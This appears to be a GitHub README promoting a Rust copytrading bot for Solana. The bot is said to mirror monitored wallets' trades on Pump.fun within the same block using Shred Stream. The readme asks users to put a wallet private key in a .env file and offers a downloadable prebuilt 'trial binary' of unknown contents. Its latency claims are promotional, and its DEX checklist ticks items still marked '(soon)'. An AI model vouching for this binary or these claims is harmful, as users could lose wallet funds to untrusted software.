# Solana Copytrading Bot — Shred-Stream Powered

## Overview

Introducing the **Solana Block-Speed Copytrading Bot**, now enhanced with **Shred Stream support via Vibe Station**. Built in **Rust** for high-speed performance, this bot mirrors trades almost instantly by parsing real-time data from Solana validators — even before transactions are finalized. Perfect for high-frequency strategies and serious on-chain tacticians.

---

## Key Features

### Shred Stream Integration (Vibe Station)

* **Faster Than Finality**: With Solana’s Shred Stream, the bot can observe transactions directly from validator data streams before they're bundled into blocks.
* **Ultra-Low Latency**: Capture trades milliseconds after they are signed—before any standard RPC or Geyser feed even sees them.
* **Proactive Copying**: React *before* blocks are built, significantly improving the chance to copy a transaction in the same block.

### Built in Rust

* **High-Performance**: Rust’s zero-cost abstractions and speed make it ideal for latency-sensitive systems.
* **Reliability**: Memory safety and predictable error handling ensure your bot runs smoothly without crashes.

### Block-Level Copytrading

* Trades are monitored and copied in real-time with block-level precision. In ideal conditions, the copied transaction lands in the same block as the original.

### Multi-DEX Support

Integrated with major Solana DEXs:

* [x] **Pump.fun**
* [x] **Pump.fun amm**
* [x] **Raydium**(soon)
* [x] **Orca**(soon)
* [x] **Meteora**(soon)

### Pluggable Architecture

Modular structure makes it easy to expand or swap logic per DEX or data source.

---

## 🛠 Project Structure

```
src/
├── core/
│   ├── token.rs          # Token definitions and serialization
│   └── tx.rs             # Transaction construction & parsing
│
├── engine/
│   ├── swap.rs           # Handles actual token swaps
│   └── monitor.rs        # Monitors targets using RPC, Geyser & Shred Stream
│
├── dex/
│   ├── pump_fun.rs       # Pump.fun integration
│   ├── raydium.rs        # Raydium integration
│   ├── meteora.rs        # Meteora integration
│   └── orca.rs           # Orca integration
│
├── services/
│   ├── jito.rs           # Jito block engine
│   ├── nextblock.rs      # Alternate fast confirmation system
│   └── shredstream.rs    # Vibe Station integration for Shred Stream
│
├── common/
│   ├── config.rs         # Config loader
│   ├── constants.rs      # Global constants
│   ├── logger.rs         # Logging utilities
│   ├── targetlist.rs     # List manager for monitored wallets
│   └── utils.rs          # General helper functions
│
├── lib.rs
└── main.rs
```

---

## ⚙️ Configuration

Set your `.env` or environment variables accordingly:

```env
PRIVATE_KEY=your_private_key
RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key
RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key
SLIPPAGE=10
JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
JITO_TIP_PERCENTILE=50
JITO_TIP_VALUE=0.004
TOKEN_PERCENTAGE=1
SHRED_STREAM_URL=wss://vibe.your-node-provider.com/shred-stream
```

> You must be connected to a Vibe Station provider or validator node that supports Shred Stream WebSocket output.

---

## Usage

1. **List Wallets to Monitor**
   Add wallet addresses (one per line) into `targetlist.txt`.

2. **Build and Run**

   ```bash
   cargo build --release
   ./target/release/raypump-copytrading-bot
   ```

3. **Watch for Output**
   Real-time logs will indicate trades copied, source wallets, DEXs, and transaction status.

---

## Real World Copy Examples

**Buy Copy (Same Block):**

* Target: [https://solscan.io/tx/4amQhsMLqv2Lbr6UyFcoTdctsD76dKAvAHFkvCDpqa6kUqeHXN7drKXpFJrqDV389Uu4rEY575WHJYdg4inSMtFf](https://solscan.io/tx/4amQhsMLqv2Lbr6UyFcoTdctsD76dKAvAHFkvCDpqa6kUqeHXN7drKXpFJrqDV389Uu4rEY575WHJYdg4inSMtFf)
* Copied: [https://solscan.io/tx/57P2bZGJ5QTThjT4jv88CXEU4oGDTgVaS2c386qBMEs2KkizN2PV7cKKZgS8uvWwPQyTpBUXTTfnjJ4dECuJf39t](https://solscan.io/tx/57P2bZGJ5QTThjT4jv88CXEU4oGDTgVaS2c386qBMEs2KkizN2PV7cKKZgS8uvWwPQyTpBUXTTfnjJ4dECuJf39t)

**Wallet:** [https://gmgn.ai/sol/address/D3QXckXy26G6rTnqHQFUxvwpRsv18o5wBrHMVoodYWTa](https://gmgn.ai/sol/address/D3QXckXy26G6rTnqHQFUxvwpRsv18o5wBrHMVoodYWTa)
**Dex:** [https://dexscreener.com/solana/JD3VPqQ7pfHZ4h2zhALfvz5E7dantyVpsDUov1Lgpump](https://dexscreener.com/solana/JD3VPqQ7pfHZ4h2zhALfvz5E7dantyVpsDUov1Lgpump)

---

## Trial Binary

Download the latest test build:
[solana-raypump-copytrading-bot(r7m-trial).zip](https://github.com/user-attachments/files/18871125/solana-raypump-copytrading-bot.r7m-trial.zip)

---

## Donate

If you appreciate this project, feel free to contribute to support further development:
**SOL Address**: `6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb`

---

## Support

Questions or help needed?
Connect on Telegram: [@whisdev](https://t.me/whisdev)